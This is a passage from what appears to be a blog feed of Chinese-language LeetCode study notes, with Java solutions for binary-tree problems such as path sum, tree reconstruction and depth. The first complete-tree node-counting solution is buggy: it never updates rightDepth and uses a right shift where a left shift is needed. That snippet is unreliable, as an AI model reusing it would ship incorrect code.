class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasPathSum</span><span class="params">(TreeNode root, <span class="type">int</span> targetSum)</span> &#123;</span><br><span class="line">        <span class="comment">//特殊情况优先</span></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        targetSum -= root.val;</span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> targetSum == <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">left</span> <span class="operator">=</span> hasPathSum(root.left,targetSum);</span><br><span class="line">            <span class="comment">//剪枝判断</span></span><br><span class="line">            <span class="keyword">if</span>(left) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span>(root.right != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">right</span> <span class="operator">=</span> hasPathSum(root.right,targetSum);</span><br><span class="line">            <span class="keyword">if</span>(right) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="从中序和后序遍历构造二叉树"><a href="#从中序和后序遍历构造二叉树" class="headerlink" title="从中序和后序遍历构造二叉树"></a>从中序和后序遍历构造二叉树</h4><p>link：<a href="https://leetcode.cn/problems/construct-binary-tree-from-inorder-and-postorder-traversal/description/">106. 从中序与后序遍历序列构造二叉树 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>其实和我们数据结构考试中的内容一致，画图推推规律.<br><img src="/../imgs/2024-10/image-20241112100932554.png" alt="image-20241112100932554"></p><p><img src="/../imgs/2024-10/image-20241112101050227.png" alt="image-20241112101050227"></p><p>根据画图规律可得 后续遍历中root位置出现在最后一个位置，再结合中序遍历可以得出9为左子树，15、20、7为右子树.<br>我使用Map进行解决,key存储值，value存储下标.<br>中序遍历中root的index + 1.<br>根据之前分析的规律，我们利用后序遍历确定root.value，然后对应在中序遍历中定位到root位置（利用index）然后回溯到中序遍历切割出左子树那么在后序遍历中剩余的部分就是右子树.</p><h6 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    Map&lt;Integer,Integer&gt; map;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] inorder, <span class="type">int</span>[] postorder)</span> &#123;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;inorder.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            map.put(inorder[i],i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> FindOrder(inorder,<span class="number">0</span>,inorder.length,postorder,<span class="number">0</span>,postorder.length);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">FindOrder</span><span class="params">(<span class="type">int</span>[] inOrder,<span class="type">int</span> inBegin,<span class="type">int</span> inEnd,<span class="type">int</span>[] postOrder,<span class="type">int</span> postBegin,<span class="type">int</span> postEnd)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//结束条件,左闭右开</span></span><br><span class="line">        <span class="keyword">if</span>(inBegin&gt;=inEnd || postBegin&gt;=postEnd)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//找到后序在中序的位置</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> map.get(postOrder[postEnd - <span class="number">1</span>]);</span><br><span class="line">        <span class="comment">//构造节点</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(inOrder[index]);</span><br><span class="line">        <span class="comment">//保存中序左子树的个数,用来确定后序的区间</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">lenOfLeft</span> <span class="operator">=</span> index - inBegin;</span><br><span class="line">        root.left = FindOrder(inOrder,inBegin,index,postOrder,postBegin,postBegin+lenOfLeft);</span><br><span class="line">        root.right = FindOrder(inOrder,index+<span class="number">1</span>,inEnd,postOrder,postBegin+lenOfLeft,postEnd-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> postIndex;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] inorder, <span class="type">int</span>[] postorder)</span> &#123;</span><br><span class="line"></span><br><span class="line">        postIndex = postorder.length-<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> buildTreeChild(postorder,inorder,<span class="number">0</span>,inorder.length-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TreeNode <span class="title function_">buildTreeChild</span><span class="params">(<span class="type">int</span>[] postorder,<span class="type">int</span>[] inorder,<span class="type">int</span> inbegin,<span class="type">int</span> inend)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1. 没有左树 或者 没有右树了</span></span><br><span class="line">        <span class="keyword">if</span>(inbegin &gt; inend) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2.创建根节点</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(postorder[postIndex]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.从中序遍历当中 找到根节点所在的下标</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">rootIndex</span> <span class="operator">=</span> findIndex(inorder,inbegin,inend,postorder[postIndex]);</span><br><span class="line">        <span class="keyword">if</span>(rootIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        postIndex--;</span><br><span class="line">        <span class="comment">//4. 创建左子树 和  右子树</span></span><br><span class="line"></span><br><span class="line">        root.right = buildTreeChild(postorder,inorder,rootIndex+<span class="number">1</span>,inend);</span><br><span class="line"></span><br><span class="line">        root.left = buildTreeChild(postorder,inorder,inbegin,rootIndex-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">findIndex</span><span class="params">(<span class="type">int</span>[] inorder,<span class="type">int</span> inbegin,<span class="type">int</span> inend,<span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> inbegin;i &lt;= inend;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(inorder[i] == key) &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong></p><h3 id="理解构建过程的示例"><a href="#理解构建过程的示例" class="headerlink" title="理解构建过程的示例"></a>理解构建过程的示例</h3><p>以中序遍历 <code>inorder = [9, 3, 15, 20, 7]</code> 和后序遍历 <code>postorder = [9, 15, 7, 20, 3]</code> 为例：</p><ol><li><strong>第一次调用</strong>：<ul><li><code>postIndex</code> 指向 <code>3</code>，创建根节点 <code>3</code>.</li><li>在中序数组中找到 <code>3</code> 的索引为 <code>1</code>.</li><li>右子树范围 <code>[15, 20, 7]</code>，左子树范围 <code>[9]</code>.</li></ul></li><li><strong>构建右子树</strong>：<ul><li>递归调用构建右子树，<code>postIndex</code> 现在指向 <code>20</code>，创建节点 <code>20</code>.</li><li>在中序数组中找到 <code>20</code> 的索引为 <code>3</code>.</li></ul></li><li><strong>构建左子树（对于 <code>20</code>）</strong>：<ul><li>继续递归构建右子树（此时后序的下一节点是 <code>7</code>）.</li><li>处理完 <code>20</code> 的右子树后，回溯到 <code>20</code>，然后处理 <code>20</code> 的左子树（为 <code>15</code>）.</li></ul></li><li><strong>构建左子树（对于 <code>3</code>）</strong>：<ul><li>现在回到根节点 <code>3</code>，处理左子树（此时后序的下一节点是 <code>9</code>）.</li></ul></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x11</title>
      <link href="/2024/11/09/yub%E3%81%AEAlgorithm.0x11/"/>
      <url>/2024/11/09/yub%E3%81%AEAlgorithm.0x11/</url>
      
        <content type="html"><![CDATA[<h4 id="二叉树的最大深度"><a href="#二叉树的最大深度" class="headerlink" title="二叉树的最大深度"></a>二叉树的最大深度</h4><p>link：<a href="https://leetcode.cn/problems/maximum-depth-of-binary-tree/description/">104. 二叉树的最大深度 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>高度：后序遍历<br>深度：前序遍历<br>但是其实这里我们可以选择后序遍历，根节点的高度就是树的深度.</p><p><img src="/../imgs/2024-10/image-20241109214025557.png" alt="image-20241109214025557"></p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getHeight(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftHeight</span> <span class="operator">=</span> getHeight(node.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightHeight</span> <span class="operator">=</span> getHeight(node.right);</span><br><span class="line">        <span class="type">int</span> <span class="variable">height</span> <span class="operator">=</span> leftHeight &gt; rightHeight ? leftHeight + <span class="number">1</span> : rightHeight + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> height;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉树的最小深度"><a href="#二叉树的最小深度" class="headerlink" title="二叉树的最小深度"></a>二叉树的最小深度</h4><p>link:<a href="https://leetcode.cn/problems/minimum-depth-of-binary-tree/description/">111. 二叉树的最小深度 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>和上题的思路基本一致，但是注意不是把最大值改成最小值.<br>自己画图分析一下有哪些情况，还是之前讲的特殊情况优先考虑.<br>按照我们上一题的思路，针对左子树只有一个节点，但右子树有至少一层分支的基础上，最小深度就不会是1了.</p><h6 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> getHeight(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftHeight</span> <span class="operator">=</span> getHeight(node.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightHeight</span> <span class="operator">=</span> getHeight(node.right);</span><br><span class="line">        <span class="keyword">if</span>(node.left == <span class="literal">null</span> &amp;&amp; node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> rightHeight + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.left != <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> leftHeight + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> leftHeight&gt;rightHeight?rightHeight+<span class="number">1</span>:leftHeight+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="完全二叉树节点个数"><a href="#完全二叉树节点个数" class="headerlink" title="完全二叉树节点个数"></a>完全二叉树节点个数</h4><p>link：<a href="https://leetcode.cn/problems/count-complete-tree-nodes/submissions/">222. 完全二叉树的节点个数 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>首先想到的是在之前深度的基础上，遍历计数节点，利用完全二叉树的性质，左子树的高度一定是大于等于右子树的高度，所以我们遍历只需要判断左子树就行.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countNodes</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getNum(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNum</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> node.left;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> node.right;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftDepth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightDepth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(right != <span class="literal">null</span>) &#123;</span><br><span class="line">            right = right.right;</span><br><span class="line">            leftDepth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(left != <span class="literal">null</span>) &#123;</span><br><span class="line">            left = left.left;</span><br><span class="line">            leftDepth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(leftDepth == rightDepth) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">2</span> &gt;&gt; leftDepth) - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftnum</span> <span class="operator">=</span> getNum(node.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightnum</span> <span class="operator">=</span> getNum(node.right);</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> leftnum + rightnum + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优化版</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countNodes</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getNumber(root);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNumber</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 计算左子树的深度</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">leftDepth</span> <span class="operator">=</span> getDepth(node.left);</span><br><span class="line">        <span class="comment">// 计算右子树的深度</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">rightDepth</span> <span class="operator">=</span> getDepth(node.right);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果左子树和右子树的深度相等，说明是完全二叉树</span></span><br><span class="line">        <span class="keyword">if</span> (leftDepth == rightDepth) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; leftDepth) + getNumber(node.right); <span class="comment">// 2^leftDepth + 右子树的节点数</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; rightDepth) + getNumber(node.left); <span class="comment">// 2^rightDepth + 左子树的节点数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 计算树的深度</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getDepth</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">depth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">            depth++;</span><br><span class="line">            node = node.left; <span class="comment">// 只计算左子树的深度</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024CUDSEC新生赛</title>
      <link href="/2024/11/09/2024CUDSEC%E6%96%B0%E7%94%9F%E8%B5%9B/"/>
      <url>/2024/11/09/2024CUDSEC%E6%96%B0%E7%94%9F%E8%B5%9B/</url>
      
